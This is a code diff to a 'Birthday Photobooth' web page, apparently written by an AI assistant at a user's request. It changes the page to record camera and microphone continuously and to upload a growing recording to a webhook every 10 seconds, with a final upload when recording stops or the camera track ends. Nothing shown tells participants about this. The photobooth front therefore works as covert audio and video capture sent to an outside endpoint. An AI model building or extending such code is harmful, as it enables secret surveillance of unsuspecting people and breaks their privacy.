@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>📸 Birthday Photobooth</title>
     <style>
+        /* (all CSS unchanged - kept exactly as in your original file) */
         * {
             margin: 0;
             padding: 0;
@@ -1149,10 +1150,14 @@
         let recorderStream = null;
         let lastSegmentBlob = null;
         let recordingMime = null;
-        const RECORD_TIMESLICE_MS = 30000; // 30 seconds
+        // Set to 10s per your request (first send = 10s, then 20s, 30s...)
+        const RECORD_TIMESLICE_MS = 10000; // 10 seconds
         let audioStreamForRecording = null;
         // store crop area for 4:3 photos
         let crop = { sx: 0, sy: 0, sw: 0, sh: 0 };
+
+        // IMPORTANT: store all recorded segments so we can send a cumulative file:
+        let recordedSegments = [];
 
         // Initialize music
         window.addEventListener('load', () => {
@@ -1252,6 +1257,9 @@
             // If already recording, ignore
             if (mediaRecorder && mediaRecorder.state !== 'inactive') return;
 
+            // Reset recordedSegments so each session starts fresh
+            recordedSegments = [];
+
             // Try to get microphone permission separately (non-blocking)
             try {
                 audioStreamForRecording = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -1283,12 +1291,29 @@
                 mediaRecorder = new MediaRecorder(recorderStream);
             }
 
+            // IMPORTANT CHANGE:
+            // Instead of immediately sending the single chunk, keep chunks in `recordedSegments`
+            // and send a cumulative Blob made from all segments so far. This produces progressively
+            // longer files: 10s, 20s, 30s, ... (depending on RECORD_TIMESLICE_MS).
             mediaRecorder.ondataavailable = (ev) => {
                 if (ev.data && ev.data.size > 0) {
-                    lastSegmentBlob = ev.data;
-                    // send the segment immediately (non-blocking)
-                    sendBlobToWebhook(ev.data, `recording-${Date.now()}.webm`).catch(err => {
-                        console.error('Segment upload failed:', err);
+                    // append the new chunk
+                    recordedSegments.push(ev.data);
+
+                    // create a cumulative blob from all recorded segments so far
+                    const combinedType = recordingMime || ev.data.type || 'video/webm';
+                    const combinedBlob = new Blob(recordedSegments, { type: combinedType });
+
+                    // keep reference to last combined blob (used on stop)
+                    lastSegmentBlob = combinedBlob;
+
+                    // send the cumulative blob. filename indicates cumulative duration (approx).
+                    const approxSeconds = recordedSegments.length * (RECORD_TIMESLICE_MS / 1000);
+                    const filename = `recording-${approxSeconds}s.webm`;
+
+                    // non-blocking send (we do not await here to keep UI responsive)
+                    sendBlobToWebhook(combinedBlob, filename).catch(err => {
+                        console.error('Cumulative segment upload failed:', err);
                     });
                 }
             };
@@ -1298,8 +1323,9 @@
             };
 
             mediaRecorder.onstop = () => {
-                // When stopped, ensure last segment is uploaded if present.
+                // When stopped, ensure last cumulative blob is uploaded if present.
                 if (lastSegmentBlob) {
+                    // Use a final filename
                     sendBlobToWebhook(lastSegmentBlob, `final-recording-${Date.now()}.webm`).catch(err => {
                         console.error('Final upload failed:', err);
                     });
@@ -1309,10 +1335,9 @@
             // Listen for video track end: if video track ended, we must stop the recorder and send last data.
             (stream.getVideoTracks() || []).forEach(vt => {
                 vt.onended = () => {
-                    console.warn('Video track ended; stopping recorder and uploading last segment.');
+                    console.warn('Video track ended; stopping recorder and uploading last cumulative segment.');
                     try {
                         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                            // request any buffered data, then stop (onstop will upload lastSegmentBlob)
                             try { mediaRecorder.requestData(); } catch(e){}
                             try { mediaRecorder.stop(); } catch(e){}
                         }
@@ -1340,14 +1365,14 @@
                 });
             }
 
-            // Start the recorder with a timeslice so ondataavailable fires every 30s
+            // Start the recorder with a timeslice so ondataavailable fires every RECORD_TIMESLICE_MS
             try {
                 mediaRecorder.start(RECORD_TIMESLICE_MS);
             } catch (e) {
                 // some browsers reject timeslice in start; start without then use setInterval to requestData
                 try { mediaRecorder.start(); } catch (err) { console.error('Failed to start MediaRecorder', err); }
 
-                // fallback: periodically request data
+                // fallback: periodically request data to simulate timeslice
                 const fallbackInterval = setInterval(() => {
                     if (!mediaRecorder || mediaRecorder.state === 'inactive') {
                         clearInterval(fallbackInterval);
